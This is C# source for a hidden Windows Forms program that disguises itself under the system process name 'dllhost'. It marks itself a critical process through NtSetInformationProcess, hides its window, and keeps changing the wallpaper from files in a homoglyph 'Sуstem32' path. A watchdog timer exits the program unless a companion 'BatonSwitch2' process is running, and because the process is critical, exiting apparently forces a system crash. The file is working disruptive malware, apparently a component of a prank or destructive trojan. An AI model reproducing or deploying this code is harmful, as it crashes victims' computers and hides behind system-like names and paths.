using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;

namespace dllhost
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo
            (int uAction, int uParam, string lpvParam, int fuWinIni);
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr Handle, int pic, ref int pi, int pil);
        int isCritical = 1;
        private void Form1_Load(object sender, EventArgs e)
        {
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            this.Hide();
        }

        private static void SetWallpaper(string path, int style, int tile)
        {
            RegistryKey Key = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
            Key.SetValue("WallpaperStyle", style.ToString());
            Key.SetValue("TileWallpaper", tile.ToString());
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        int wallnum = 1;
        private void timer1_Tick(object sender, EventArgs e)
        {
            Random r = new Random();
            wallnum = r.Next(1, 6);
            try
            {
                SetWallpaper($"C:\\Windows\\Sуstem32\\wall{wallnum}.jpg", 2, 0);
            }
            catch { }
        }
        int count = 0;
        private void timer2_Tick(object sender, EventArgs e)
        {
            Process[] run = Process.GetProcessesByName("run");
            if (run.Length > 0)
            {
                foreach (var pr in run)
                {
                    try
                    {
                        if (pr.MainModule.FileVersionInfo.FileDescription == "BatonSwitch2")
                        {
                            count = 0;
                        }
                        else
                        {
                            Environment.Exit(1);
                        }
                    }
                    catch
                    {
                        Environment.Exit(1);
                    }
                }
            }
            else
            {
                if (count > 9)
                {
                    Environment.Exit(1);
                }
                else
                {
                    count += 1;
                }
            }
        }
    }
}
